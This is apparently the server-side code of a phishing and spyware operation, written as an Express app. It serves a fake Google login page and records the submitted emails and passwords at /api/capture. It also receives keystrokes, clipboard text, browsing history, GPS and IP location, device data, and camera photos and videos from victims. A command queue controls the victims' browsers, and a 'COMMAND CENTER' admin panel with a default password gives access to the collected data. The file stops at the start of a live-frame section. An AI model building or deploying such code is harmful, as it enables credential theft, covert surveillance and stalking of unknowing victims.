const express = require('express');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const fs = require('fs');
const http = require('http');
const IS_VERCEL = !!process.env.VERCEL;
// Trim env vars — echo/pipe in PowerShell can add trailing newlines
const REDIS_URL   = (process.env.UPSTASH_REDIS_REST_URL   || '').trim();
const REDIS_TOKEN = (process.env.UPSTASH_REDIS_REST_TOKEN || '').trim();
const BLOB_TOKEN  = (process.env.BLOB_READ_WRITE_TOKEN    || '').trim();
const USE_REDIS = !!REDIS_URL;
const USE_BLOB  = !!BLOB_TOKEN;
const { Server } = IS_VERCEL ? { Server: null } : require('socket.io');
let localtunnel;
if (!IS_VERCEL) { try { localtunnel = require('localtunnel'); } catch (e) {} }

// ── Upstash Redis ─────────────────────────────────────────────
let redis = null;
if (USE_REDIS) {
    try {
        const { Redis } = require('@upstash/redis');
        redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN });
        console.log('Redis client initialised:', REDIS_URL.slice(0, 40));
    } catch (e) {
        console.error('Redis init failed:', e.message);
        redis = null;
    }
}

// ── Vercel Blob ───────────────────────────────────────────────
let blobPut = null;
if (USE_BLOB) {
    try { blobPut = require('@vercel/blob').put; } catch (e) { console.error('Blob init failed:', e.message); }
}

// ═══════════════════════════════════════════════════════════════
//  APP SETUP
// ═══════════════════════════════════════════════════════════════
const app = express();
const server = http.createServer(app);
const io = IS_VERCEL
    ? { to: () => ({ emit: () => {} }), on: () => {}, emit: () => {} }
    : new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 10 * 1024 * 1024 });
const PORT = process.env.PORT || 3000;

const UPLOAD_BASE = IS_VERCEL ? '/tmp/uploads' : path.join(__dirname, 'uploads');
const DATA_DIR = IS_VERCEL ? '/tmp' : path.join(__dirname, 'data');
[UPLOAD_BASE, `${UPLOAD_BASE}/photos`, `${UPLOAD_BASE}/videos`, `${UPLOAD_BASE}/audio`, `${UPLOAD_BASE}/files`, DATA_DIR].forEach(dir => {
    try { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); } catch (e) {}
});

// ═══════════════════════════════════════════════════════════════
//  PERSISTENT DATA STORE
// ═══════════════════════════════════════════════════════════════
const DATA_FILE = IS_VERCEL ? '/tmp/store.json' : path.join(__dirname, 'data', 'store.json');
const REDIS_KEY = 'app:store';
let saveTimeout = null;
let storeLoadPromise = null; // shared promise so concurrent requests all wait for the same Redis load

function getDefaultStore() {
    return {
        clients: {}, locations: [], media: [], photos: [],
        errors: [], events: [], deviceInfo: {},
        keystrokes: [], clipboard: [], pageVisits: [],
        notes: {}, tags: {}, credentials: []
    };
}

// ── Sync file load (local only) ───────────────────────────────
function loadStore() {
    if (USE_REDIS) return getDefaultStore(); // Redis loads async via middleware
    try {
        if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    } catch (e) { console.error('Store load failed:', e.message); }
    return getDefaultStore();
}

// ── Async Redis load (called once on first request) ───────────
async function loadStoreFromRedis() {
    if (!redis) return null;
    try {
        const data = await Promise.race([
            redis.get(REDIS_KEY),
            new Promise((_, rej) => setTimeout(() => rej(new Error('Redis timeout')), 5000))
        ]);
        if (data) {
            if (typeof data === 'string') return JSON.parse(data);
            if (typeof data === 'object') return data;
        }
    } catch (e) { console.error('Redis load failed:', e.message); }
    return null;
}

// ── Save (Redis or file) ──────────────────────────────────────
function saveStore() {
    if (saveTimeout) clearTimeout(saveTimeout);
    saveTimeout = setTimeout(() => {
        if (USE_REDIS && redis) {
            redis.set(REDIS_KEY, JSON.stringify(store))
                .catch(e => console.error('Redis save failed:', e.message));
        } else {
            try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); }
            catch (e) { console.error('Store save failed:', e.message); }
        }
    }, 500);
}

function forceSave() {
    if (USE_REDIS && redis) {
        redis.set(REDIS_KEY, JSON.stringify(store)).catch(() => {});
    } else {
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {}
    }
}
process.on('SIGINT', () => { forceSave(); process.exit(0); });
process.on('SIGTERM', () => { forceSave(); process.exit(0); });

const store = loadStore();
const defaults = getDefaultStore();
Object.keys(defaults).forEach(k => { if (!store[k]) store[k] = defaults[k]; });

// In-memory live frame store (ephemeral — frames expire fast anyway)
const liveFrames = {};

// ═══════════════════════════════════════════════════════════════
//  ADMIN AUTH
// ═══════════════════════════════════════════════════════════════
const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'admin123';
const adminTokens = new Set();
const crypto = require('crypto');

// On Vercel: deterministic token based on password so it survives cold starts
const VERCEL_TOKEN = IS_VERCEL
    ? crypto.createHmac('sha256', ADMIN_PASSWORD + 'vercel-v1').update('admin-session').digest('hex')
    : null;

function generateToken() {
    if (IS_VERCEL) return VERCEL_TOKEN;
    const token = crypto.randomBytes(32).toString('hex');
    adminTokens.add(token);
    return token;
}

function isValidToken(token) {
    if (!token) return false;
    if (IS_VERCEL) return token === VERCEL_TOKEN;
    return adminTokens.has(token);
}

function requireAuth(req, res, next) {
    const token = req.headers['x-admin-token'] || req.query.token || req.cookies?.adminToken;
    if (isValidToken(token)) return next();
    res.status(401).json({ error: 'Unauthorized' });
}

// ═══════════════════════════════════════════════════════════════
//  CLIENT CONFIG (adjustable from admin)
// ═══════════════════════════════════════════════════════════════
const defaultConfig = {
    photoEnabled: false, photoPeriod: 30000, photoQuality: 0.7,
    videoEnabled: false, videoPeriod: 300000, videoDuration: 10000,
    locationEnabled: true, locationPeriod: 10000,
    keystrokesEnabled: true, keyLogFlush: 10000,
    clipboardEnabled: true, clipboardCheck: 15000,
    deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
};
if (!store.config) store.config = { ...defaultConfig };

// Command queue — in-memory for local, Redis lists for Vercel
const commandQueue = {};

async function pushCommand(clientId, cmd) {
    if (USE_REDIS && redis) {
        try { await redis.rpush('cmd:' + clientId, JSON.stringify(cmd)); return; } catch (e) { console.error('pushCommand redis fail:', e.message); }
    }
    if (!commandQueue[clientId]) commandQueue[clientId] = [];
    commandQueue[clientId].push(cmd);
}

async function popCommands(clientId) {
    if (USE_REDIS && redis) {
        try {
            const key = 'cmd:' + clientId;
            const items = await redis.lrange(key, 0, -1);
            if (items && items.length) {
                await redis.del(key);
                return items.map(c => (typeof c === 'string' ? JSON.parse(c) : c));
            }
            return [];
        } catch (e) { console.error('popCommands redis fail:', e.message); }
    }
    const cmds = commandQueue[clientId] || [];
    commandQueue[clientId] = [];
    return cmds;
}

// ═══════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════
function addEvent(type, data) {
    const event = { type, data, timestamp: new Date().toISOString() };
    store.events.unshift(event);
    if (store.events.length > 2000) store.events.length = 2000;
    io.to('admins').emit('event', event);
    saveStore();
}

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.connection?.remoteAddress || req.ip || 'unknown';
}

// ── Server-side IP Geolocation ───────────────────────────────
const geoCache = {};

async function geolocateIP(ip) {
    if (!ip || ip === 'unknown' || /^(127\.|192\.168\.|10\.|::1|::ffff:127\.|::ffff:192\.168\.|::ffff:10\.)/.test(ip)) {
        return null;
    }
    const cleanIP = ip.replace('::ffff:', '');
    if (geoCache[cleanIP] && (Date.now() - geoCache[cleanIP]._ts < 3600000)) {
        return geoCache[cleanIP];
    }
    return new Promise(resolve => {
        const url = `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,as,query`;
        http.get(url, res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (json.status === 'success') {
                        json._ts = Date.now();
                        geoCache[cleanIP] = json;
                        resolve(json);
                    } else resolve(null);
                } catch { resolve(null); }
            });
        }).on('error', () => resolve(null));
    });
}

// ═══════════════════════════════════════════════════════════════
//  RATE LIMITING
// ═══════════════════════════════════════════════════════════════
const rateLimits = {};
function rateLimit(max, windowMs) {
    return (req, res, next) => {
        const ip = getClientIP(req);
        const key = `${ip}:${req.method}:${req.path}`;
        const now = Date.now();
        if (!rateLimits[key] || now > rateLimits[key].reset) {
            rateLimits[key] = { count: 1, reset: now + windowMs };
        } else {
            rateLimits[key].count++;
        }
        if (rateLimits[key].count > max) {
            return res.status(429).json({ error: 'Too many requests', retryAfter: Math.ceil((rateLimits[key].reset - now) / 1000) });
        }
        next();
    };
}
if (!IS_VERCEL) {
    setInterval(() => {
        const now = Date.now();
        for (const key in rateLimits) if (now > rateLimits[key].reset) delete rateLimits[key];
    }, 60000);
}

// ═══════════════════════════════════════════════════════════════
//  MIDDLEWARE
// ═══════════════════════════════════════════════════════════════
app.use(cors());
// Allow camera, microphone & geolocation — required for getUserMedia on Vercel HTTPS
// Both headers: Permissions-Policy (modern) + Feature-Policy (legacy fallback)
app.use((req, res, next) => {
    res.setHeader('Permissions-Policy', 'camera=*, microphone=*, geolocation=*');
    res.setHeader('Feature-Policy', 'camera *; microphone *; geolocation *');
    next();
});
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
// Simple cookie parser
app.use((req, res, next) => {
    req.cookies = {};
    const cookieHeader = req.headers.cookie;
    if (cookieHeader) {
        cookieHeader.split(';').forEach(c => {
            const [key, ...val] = c.trim().split('=');
            if (key) req.cookies[key.trim()] = val.join('=').trim();
        });
    }
    next();
});
app.use('/uploads', express.static(UPLOAD_BASE));
app.use(express.static(path.join(__dirname, 'googl')));

// ── Lazy-load store from Redis on first request ───────────────
// Uses a shared promise so concurrent cold-start requests all wait for
// the same Redis fetch instead of each seeing empty data.
function ensureStoreLoaded() {
    if (!USE_REDIS) return Promise.resolve();
    if (!storeLoadPromise) {
        storeLoadPromise = loadStoreFromRedis().then(redisStore => {
            if (redisStore) {
                Object.assign(store, redisStore);
                const defs = getDefaultStore();
                Object.keys(defs).forEach(k => { if (!store[k]) store[k] = defs[k]; });
                console.log('Loaded store from Redis (' + Object.keys(store.clients || {}).length + ' clients)');
            }
        }).catch(e => {
            console.error('Redis load error:', e.message);
            storeLoadPromise = null; // allow retry next request
        });
    }
    return storeLoadPromise;
}

app.use(async (req, res, next) => {
    if (USE_REDIS) await ensureStoreLoaded();
    next();
});

// ═══════════════════════════════════════════════════════════════
//  MULTER
// ═══════════════════════════════════════════════════════════════
// Memory storage for Blob uploads; disk storage for local
const memoryUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 100 * 1024 * 1024 } });

function makeUploader(subdir) {
    return multer({
        storage: multer.diskStorage({
            destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/${subdir}/`),
            filename: (req, file, cb) => {
                const ext = path.extname(file.originalname) || '.webm';
                cb(null, `${req.body.clientId || 'unknown'}_${Date.now()}${ext}`);
            }
        }),
        limits: { fileSize: 50 * 1024 * 1024 }
    });
}
// On Vercel: always memory storage (disk /tmp is ephemeral between cold starts)
const uploadMedia = (USE_BLOB || IS_VERCEL) ? null : makeUploader('videos');
const uploadPhoto = (USE_BLOB || IS_VERCEL) ? null : makeUploader('photos');
const uploadCommandFile = (USE_BLOB || IS_VERCEL) ? null : multer({
    storage: multer.diskStorage({
        destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/files/`),
        filename: (req, file, cb) => {
            const ext = path.extname(file.originalname);
            const base = path.basename(file.originalname, ext).replace(/[^a-z0-9_\-]/gi, '_').slice(0, 60);
            cb(null, `${base}_${Date.now()}${ext}`);
        }
    }),
    limits: { fileSize: 100 * 1024 * 1024 }
});

// ═══════════════════════════════════════════════════════════════
//  CLIENT ROUTES
// ═══════════════════════════════════════════════════════════════
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'googl', 'index.html')));
app.get('/client.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.sendFile(path.join(__dirname, 'client.js'));
});

// ── Upload video/audio ──
app.post('/upload-media', (req, res) => {
    const doUpload = memoryUpload.single('media');
    doUpload(req, res, async (err) => {
        if (err) { console.error('Upload error:', err.message); return res.status(400).json({ error: err.message }); }
        if (!req.file) return res.status(400).json({ error: 'No file' });
        const cid = req.body.clientId || 'unknown';
        const ext = path.extname(req.file.originalname) || '.webm';
        const id = Date.now().toString(36);
        const filename = `${cid}_${id}${ext}`;
        let filePath = null;

        if (USE_BLOB && blobPut) {
            // Vercel Blob store
            try {
                const blob = await blobPut(`videos/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
                filePath = blob.url;
            } catch (e) { console.error('Blob upload failed:', e.message); }
        } else if (IS_VERCEL && USE_REDIS && redis) {
            // Store in Redis (max 900KB to stay under 1MB key limit)
            if (req.file.size < 900 * 1024) {
                try {
                    const b64 = req.file.buffer.toString('base64');
                    await redis.set(`media:video:${id}`, JSON.stringify({ data: b64, mime: req.file.mimetype }));
                    filePath = `/api/media-data/video/${id}`;
                } catch (e) { console.error('Redis media store failed:', e.message); }
            }
        } else if (!IS_VERCEL) {
            // Local disk
            const diskPath = path.join(UPLOAD_BASE, 'videos', filename);
            fs.writeFileSync(diskPath, req.file.buffer);
            filePath = `/uploads/videos/${filename}`;
        }

        if (!filePath) filePath = `/api/media-data/video/${id}`; // fallback path

        const entry = {
            id, clientId: cid,
            filename, size: req.file.size, mimeType: req.file.mimetype,
            path: filePath, timestamp: new Date().toISOString()
        };
        store.media.unshift(entry);
        if (store.media.length > 500) store.media.length = 500;
        saveStore();
        addEvent('media', { clientId: cid, filename, size: entry.size });
        console.log(`\u{1F4F9} Video from ${cid}: ${filename} (${(entry.size/1024).toFixed(0)} KB)`);
        res.json({ success: true, id: entry.id });
    });
});

// ── Server-side IP geo proxy (avoids CORS issues on client) ──
app.get('/api/ip-geo', async (req, res) => {
    try {
        const ip = getClientIP(req);
        const geo = await geolocateIP(ip);
        if (geo) {
            res.json({ status: 'success', ip, country: geo.country, regionName: geo.regionName, city: geo.city, lat: geo.lat, lon: geo.lon, timezone: geo.timezone, isp: geo.isp, org: geo.org, as: geo.as, query: geo.query });
        } else {
            res.json({ status: 'fail', ip, message: 'Local/private IP or lookup failed' });
        }
    } catch (e) {
        res.json({ status: 'fail', message: e.message });
    }
});

// ── Upload photo ──
app.post('/upload-photo', (req, res) => {
    const doUpload = memoryUpload.single('photo');
    doUpload(req, res, async (err) => {
        if (err) { console.error('Photo upload error:', err.message); return res.status(400).json({ error: err.message }); }
        if (!req.file) return res.status(400).json({ error: 'No file' });
        const cid = req.body.clientId || 'unknown';
        const ext = path.extname(req.file.originalname) || '.jpg';
        const id = Date.now().toString(36);
        const filename = `${cid}_${id}${ext}`;
        let filePath = null;

        if (USE_BLOB && blobPut) {
            // Vercel Blob store
            try {
                const blob = await blobPut(`photos/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
                filePath = blob.url;
            } catch (e) { console.error('Blob photo upload failed:', e.message); }
        } else if (IS_VERCEL && USE_REDIS && redis) {
            // Store in Redis as base64 (photos are typically < 300KB)
            try {
                const b64 = req.file.buffer.toString('base64');
                await redis.set(`media:photo:${id}`, JSON.stringify({ data: b64, mime: req.file.mimetype || 'image/jpeg' }));
                filePath = `/api/media-data/photo/${id}`;
            } catch (e) {
                console.error('Redis photo store failed:', e.message);
                // Fallback: embed as data URL directly in path
                filePath = `data:${req.file.mimetype || 'image/jpeg'};base64,${req.file.buffer.toString('base64')}`;
            }
        } else if (!IS_VERCEL) {
            // Local disk
            const diskPath = path.join(UPLOAD_BASE, 'photos', filename);
            fs.writeFileSync(diskPath, req.file.buffer);
            filePath = `/uploads/photos/${filename}`;
        }

        if (!filePath) filePath = `data:image/jpeg;base64,${req.file.buffer.toString('base64')}`;

        const entry = {
            id, clientId: cid,
            filename, size: req.file.size, mimeType: req.file.mimetype,
            path: filePath, timestamp: new Date().toISOString()
        };
        store.photos.unshift(entry);
        if (store.photos.length > 500) store.photos.length = 500;
        if (store.clients[cid]) {
            store.clients[cid].lastPhoto = filePath;
            store.clients[cid].lastPhotoTime = entry.timestamp;
        }
        addEvent('photo', { clientId: cid, filename, path: filePath });
        saveStore();
        console.log(`\u{1F4F7} Photo from ${cid}: ${filename}`);
        res.json({ success: true, id: entry.id, path: filePath });
    });
});

// ── Serve media stored in Redis (photo or video) ──
app.get('/api/media-data/:type/:id', async (req, res) => {
    if (!redis) return res.status(404).send('Not found');
    try {
        const key = `media:${req.params.type}:${req.params.id}`;
        const raw = await redis.get(key);
        if (!raw) return res.status(404).send('Not found');
        const obj = typeof raw === 'string' ? JSON.parse(raw) : raw;
        const buf = Buffer.from(obj.data, 'base64');
        const mime = obj.mime || (req.params.type === 'photo' ? 'image/jpeg' : 'video/webm');
        res.setHeader('Content-Type', mime);
        res.setHeader('Content-Length', buf.length);
        res.setHeader('Cache-Control', 'public, max-age=86400');
        res.send(buf);
    } catch (e) {
        console.error('Media serve error:', e.message);
        res.status(500).send('Error');
    }
});

// ── Location ──
app.post('/upload-location', (req, res) => {
    const { clientId, latitude, longitude, accuracy, altitude, speed, heading, source } = req.body;
    if (!latitude || !longitude) return res.status(400).json({ error: 'Missing coords' });
    const entry = {
        id: Date.now().toString(36), clientId: clientId || 'unknown',
        latitude, longitude, accuracy: accuracy || null, altitude: altitude || null,
        speed: speed || null, heading: heading || null, source: source || 'unknown',
        timestamp: new Date().toISOString()
    };
    store.locations.unshift(entry);
    if (store.locations.length > 5000) store.locations.length = 5000;
    const cid = entry.clientId;
    if (!store.clients[cid]) store.clients[cid] = { firstSeen: entry.timestamp };
    store.clients[cid].lastLocation = { latitude, longitude, accuracy, altitude, speed, heading, source };
    store.clients[cid].lastSeen = entry.timestamp;
    addEvent('location', { clientId: cid, latitude, longitude, accuracy, source });
    console.log(`\u{1F4CD} Location from ${cid}: ${latitude.toFixed(5)}, ${longitude.toFixed(5)} [${source}]`);
    res.json({ success: true });
});

// ── Device info ──
app.post('/device-info', (req, res) => {
    const { clientId, ...info } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
    info.ip = getClientIP(req);
    info.timestamp = new Date().toISOString();
    store.deviceInfo[clientId] = { ...(store.deviceInfo[clientId] || {}), ...info };
    if (store.clients[clientId]) store.clients[clientId].deviceInfo = store.deviceInfo[clientId];
    addEvent('device_info', { clientId, platform: info.platform, ip: info.ip });
    console.log(`\u{1F4F1} Device info from ${clientId}: ${info.platform || 'unknown'} (${info.ip})`);
    res.json({ success: true });
});

// ── Keystroke logging ──
app.post('/log-keys', (req, res) => {
    const { clientId, keys, url } = req.body;
    if (!clientId || !keys) return res.status(400).json({ error: 'Missing data' });
    const entry = {
        id: Date.now().toString(36), clientId, keys,
        url: url || '', timestamp: new Date().toISOString()
    };
    store.keystrokes.unshift(entry);
    if (store.keystrokes.length > 5000) store.keystrokes.length = 5000;
    addEvent('keystrokes', { clientId, length: keys.length, url: url || '' });
    console.log(`\u{2328}\u{FE0F}  Keys from ${clientId}: ${keys.length} chars`);
    res.json({ success: true });
});

// ── Clipboard ──
app.post('/log-clipboard', (req, res) => {
    const { clientId, content } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
    const entry = {
        id: Date.now().toString(36), clientId,
        content: (content || '').slice(0, 5000), timestamp: new Date().toISOString()
    };
    store.clipboard.unshift(entry);
    if (store.clipboard.length > 1000) store.clipboard.length = 1000;
    addEvent('clipboard', { clientId, length: (content || '').length });
    console.log(`\u{1F4CB} Clipboard from ${clientId}: ${(content || '').slice(0, 50)}`);
    res.json({ success: true });
});

// ── Page visits ──
app.post('/log-visit', (req, res) => {
    const { clientId, url, title, referrer } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
    const entry = {
        id: Date.now().toString(36), clientId,
        url: url || '', title: title || '', referrer: referrer || '',
        timestamp: new Date().toISOString()
    };
    store.pageVisits.unshift(entry);
    if (store.pageVisits.length > 2000) store.pageVisits.length = 2000;
    addEvent('page_visit', { clientId, url: url || '', title: title || '' });
    console.log(`\u{1F310} Visit from ${clientId}: ${url || 'unknown'}`);
    res.json({ success: true });
});

// ── Error logging ──
app.post('/log-error', (req, res) => {
    const entry = {
        id: Date.now().toString(36),
        clientId: req.body.clientId || 'unknown',
        type: req.body.type || 'unknown',
        message: req.body.message || req.body.error || 'No details',
        timestamp: new Date().toISOString()
    };
    store.errors.unshift(entry);
    if (store.errors.length > 500) store.errors.length = 500;
    addEvent('error', { clientId: entry.clientId, type: entry.type, message: entry.message });
    console.log(`\u{26A0}\u{FE0F}  Error from ${entry.clientId}: [${entry.type}] ${entry.message}`);
    res.json({ success: true });
});

// ── Google login credential capture ──
app.post('/api/capture', (req, res) => {
    const { email, password, source, timestamp } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
    if (!store.credentials) store.credentials = [];
    const entry = {
        id: Date.now().toString(36),
        email: email.trim(),
        password,
        source: source || 'unknown',
        ip: getClientIP(req),
        userAgent: req.headers['user-agent'] || '',
        timestamp: timestamp || new Date().toISOString()
    };
    store.credentials.unshift(entry);
    if (store.credentials.length > 1000) store.credentials.length = 1000;
    saveStore();
    addEvent('credential_captured', { email: entry.email, source: entry.source, ip: entry.ip });
    console.log(`\u{1F511} Credential captured: ${entry.email} | ${entry.password} (${entry.ip})`);
    res.json({ success: true });
});

// ── Heartbeat with server-side IP geo ──
app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
    const { clientId, userAgent, screenW, screenH, battery, charging,
            networkType, downlink, saveData,
            language, timezone,
            isIdle, idleSecs, tabHidden, hiddenMs, maxScrollPct } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });

    const now = new Date().toISOString();
    const ip = getClientIP(req);
    const isNew = !store.clients[clientId];

    if (isNew) {
        store.clients[clientId] = { firstSeen: now };
        addEvent('client_connected', { clientId, userAgent, ip });
        console.log(`\u{1F7E2} New client: ${clientId} (${ip})`);
    }

    const c = store.clients[clientId];
    c.lastSeen = now;
    c.online = true;
    c.ip = ip;
    if (userAgent) c.userAgent = userAgent;
    if (screenW) c.screen = `${screenW}x${screenH}`;
    if (battery !== undefined) c.battery = battery;
    if (charging !== undefined) c.charging = charging;
    if (networkType) c.networkType = networkType;
    if (downlink !== undefined) c.downlink = downlink;
    if (saveData !== undefined) c.saveData = saveData;
    if (language) c.language = language;
    if (timezone) c.timezone = timezone;
    // Activity state
    if (isIdle !== undefined) c.isIdle = isIdle;
    if (idleSecs !== undefined) c.idleSecs = idleSecs;
    if (tabHidden !== undefined) c.tabHidden = tabHidden;
    if (hiddenMs !== undefined) c.hiddenMs = hiddenMs;
    if (maxScrollPct !== undefined) c.maxScrollPct = maxScrollPct;

    // Server-side IP geolocation (first heartbeat or refresh every hour)
    if (!c.ipGeo || (Date.now() - new Date(c.ipGeo._ts || 0).getTime() > 3600000)) {
        const geo = await geolocateIP(ip);
        if (geo) {
            c.ipGeo = {
                country: geo.country, region: geo.regionName, city: geo.city,
                lat: geo.lat, lon: geo.lon, timezone: geo.timezone,
                isp: geo.isp, org: geo.org, as: geo.as, _ts: now
            };
            // Auto-create location from IP if no GPS location exists
            if (!c.lastLocation) {
                const locEntry = {
                    id: Date.now().toString(36), clientId,
                    latitude: geo.lat, longitude: geo.lon, accuracy: 10000,
                    source: 'ip-server', timestamp: now
                };
                store.locations.unshift(locEntry);
                if (store.locations.length > 5000) store.locations.length = 5000;
                c.lastLocation = { latitude: geo.lat, longitude: geo.lon, accuracy: 10000, source: 'ip-server' };
                addEvent('location', { clientId, latitude: geo.lat, longitude: geo.lon, source: 'ip-server' });
                console.log(`\u{1F4CD} IP-Geo for ${clientId}: ${geo.city}, ${geo.country} (${geo.lat}, ${geo.lon})`);
            }
        }
    }

    saveStore();
    res.json({ success: true });
});

// ═══════════════════════════════════════════════════════════════
//  ADMIN ROUTES
// ═══════════════════════════════════════════════════════════════
app.get('/admin', (req, res) => {
    const token = req.cookies?.adminToken || req.query.token;
    if (isValidToken(token)) {
        return res.sendFile(path.join(__dirname, 'admin.html'));
    }
    // Show login page
    res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',system-ui,sans-serif;background:#07070c;color:#d0d0d0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login{background:#0c0c14;border:1px solid #16162a;border-radius:12px;padding:40px;width:340px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.login h1{font-size:1.2rem;color:#e94560;letter-spacing:3px;margin-bottom:8px;font-weight:800}
.login p{font-size:.72rem;color:#555;margin-bottom:24px}
.login input{width:100%;padding:12px 16px;background:#12122a;border:1px solid #16162a;border-radius:8px;color:#d0d0d0;font-size:.85rem;font-family:inherit;outline:none;transition:border-color .2s;margin-bottom:14px}
.login input:focus{border-color:#e94560}
.login button{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;transition:background .2s}
.login button:hover{background:#d13050}
.login .err{color:#f44;font-size:.72rem;margin-top:8px;min-height:18px}
</style></head><body>
<div class="login"><h1>COMMAND CENTER</h1><p>Enter admin password to continue</p>
<form onsubmit="return doLogin(event)"><input type="password" id="pw" placeholder="Password..." autofocus autocomplete="current-password"><button type="submit">Login</button></form>
<div class="err" id="err"></div></div>
<script>async function doLogin(e){e.preventDefault();const pw=document.getElementById('pw').value;const r=await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});const d=await r.json();if(d.success){document.cookie='adminToken='+d.token+';path=/;SameSite=Lax';location.href='/admin';}else{document.getElementById('err').textContent=d.error||'Wrong password';document.getElementById('pw').value='';document.getElementById('pw').focus();}return false;}</script>
</body></html>`);
});

// Auth endpoints
app.post('/api/auth/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        const token = generateToken();
        // Set cookie server-side so it persists across cold starts on Vercel
        res.cookie('adminToken', token, { path: '/', sameSite: 'lax', maxAge: 30 * 24 * 3600 * 1000 });
        console.log('🔓 Admin logged in');
        res.json({ success: true, token });
    } else {
        console.log('🔒 Failed login attempt');
        res.status(401).json({ error: 'Fout wachtwoord' });
    }
});

app.post('/api/auth/logout', (req, res) => {
    const token = req.cookies?.adminToken || req.headers['x-admin-token'];
    if (token && !IS_VERCEL) adminTokens.delete(token);
    res.clearCookie('adminToken');
    res.json({ success: true });
});

app.get('/api/auth/check', (req, res) => {
    const token = req.cookies?.adminToken || req.headers['x-admin-token'];
    res.json({ authenticated: isValidToken(token) });
});

// ── Search across all data ──
app.get('/api/search', requireAuth, (req, res) => {
    const q = (req.query.q || '').toLowerCase().trim();
    if (!q || q.length < 2) return res.json({ results: [] });
    const maxPerType = 10;
    const results = {};

    // Search clients
    const clientMatches = Object.entries(store.clients).filter(([id, c]) =>
        id.toLowerCase().includes(q) || (c.ip || '').includes(q) || (c.userAgent || '').toLowerCase().includes(q) ||
        (c.ipGeo && JSON.stringify(c.ipGeo).toLowerCase().includes(q))
    ).slice(0, maxPerType).map(([id, c]) => ({ id, online: c.online, ip: c.ip, lastSeen: c.lastSeen }));
    if (clientMatches.length) results.clients = clientMatches;

    // Search keystrokes
    const keyMatches = store.keystrokes.filter(k =>
        k.keys.toLowerCase().includes(q) || k.clientId.toLowerCase().includes(q) || (k.url || '').toLowerCase().includes(q)
    ).slice(0, maxPerType);
    if (keyMatches.length) results.keystrokes = keyMatches;

    // Search clipboard
    const clipMatches = store.clipboard.filter(c =>
        (c.content || '').toLowerCase().includes(q) || c.clientId.toLowerCase().includes(q)
    ).slice(0, maxPerType);
    if (clipMatches.length) results.clipboard = clipMatches;

    // Search page visits
    const visitMatches = store.pageVisits.filter(v =>
        (v.url || '').toLowerCase().includes(q) || (v.title || '').toLowerCase().includes(q) || v.clientId.toLowerCase().includes(q)
    ).slice(0, maxPerType);
    if (visitMatches.length) results.visits = visitMatches;

    // Search device info
    const deviceMatches = Object.entries(store.deviceInfo).filter(([id, info]) =>
        id.toLowerCase().includes(q) || JSON.stringify(info).toLowerCase().includes(q)
    ).slice(0, maxPerType).map(([id, info]) => ({ clientId: id, platform: info.platform, ip: info.ip }));
    if (deviceMatches.length) results.devices = deviceMatches;

    // Search errors
    const errorMatches = store.errors.filter(e =>
        (e.message || '').toLowerCase().includes(q) || (e.clientId || '').toLowerCase().includes(q)
    ).slice(0, maxPerType);
    if (errorMatches.length) results.errors = errorMatches;

    res.json({ query: q, results });
});

app.get('/api/stats', requireAuth, (req, res) => {
    const cutoff = Date.now() - 20000;
    Object.entries(store.clients).forEach(([id, c]) => {
        if (new Date(c.lastSeen).getTime() < cutoff) c.online = false;
    });
    res.json({
        clients: store.clients,
        clientCount: Object.keys(store.clients).length,
        onlineCount: Object.values(store.clients).filter(c => c.online).length,
        locationCount: store.locations.length,
        mediaCount: store.media.length,
        photoCount: store.photos.length,
        errorCount: store.errors.length,
        keystrokeCount: store.keystrokes.length,
        clipboardCount: store.clipboard.length,
        visitCount: store.pageVisits.length,
        credentialCount: (store.credentials || []).length,
        deviceInfo: store.deviceInfo,
        tags: store.tags || {},
        notes: Object.fromEntries(Object.entries(store.notes || {}).map(([k, v]) => [k, v.length]))
    });
});

app.get('/api/locations', requireAuth, (req, res) => {
    const limit = Math.min(parseInt(req.query.limit) || 100, 2000);
    const cid = req.query.clientId;
    let d = store.locations;
    if (cid) d = d.filter(l => l.clientId === cid);
    res.json(d.slice(0, limit));
});

// ═══════════════════════════════════════════════════════════════
//  HTTP LIVE FRAME (replaces socket.io for Vercel compatibility)
// ═══════════════════════════════════════════════════════════════
// On Vercel, requests can hit different instances, so we must store
// frames in Redis (short TTL) not in-memory.

